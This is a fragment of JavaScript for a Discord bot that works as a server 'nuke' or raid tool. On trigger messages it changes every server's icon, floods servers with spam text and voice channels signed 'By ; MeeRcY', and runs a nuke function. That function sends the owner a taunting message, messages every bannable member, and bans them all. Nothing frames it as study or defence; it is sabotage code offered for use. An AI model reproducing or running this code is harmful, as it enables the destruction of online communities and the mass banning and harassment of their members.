...
LOka.user.setUsername("' #Mَeَeَ.َ")
...
LOka.on('message', message => {
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/355815702596157441/420788313465552911/fbb09c9c87cbd227.jpg`)
})
}
});
LOka.on('message', message => {
...
LOka.on('message', message => {
     if (message.content === "1") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/355815702596157441/420788313465552911/fbb09c9c87cbd227.jpg`)
...
LOka.on('message', message => {
         if (message.content === "2") {
               LOka.guilds.forEach(m =>{
m.createChannel('By ; MeeRcY .. ', 'text');
m.createChannel('By ; MeeRcY .. ', 'text');
m.createChannel('By ; MeeRcY .. ', 'text');
m.createChannel('By ; MeeRcY .. ', 'text');
m.createChannel('By ; MeeRcY .. ', 'text');
...
LOka.on('message', message => {
         if (message.content === "1") {
                 LOka.guilds.forEach(m =>{
m.createChannel('By ; MeeRcY .. ', 'voice');
m.createChannel('By ; MeeRcY .. ', 'voice');
m.createChannel('By ; MeeRcY .. ', 'voice');
m.createChannel('By ; MeeRcY .. ', 'voice');
m.createChannel('By ; MeeRcY .. ', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' By ; MeeRcY. `Sorry "Owner."` ').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send(' By ; MeeRcY. `#SPz ~` ').catch(e => { return void e; });
      return m.ban();
    }
  }));
    ...
    await guild.createChannel('By ; MeeRcY .. / آلضيممء ،', 'voice');
 
      await guild.createChannel('By ; MeeRcY .. ', 'voice');
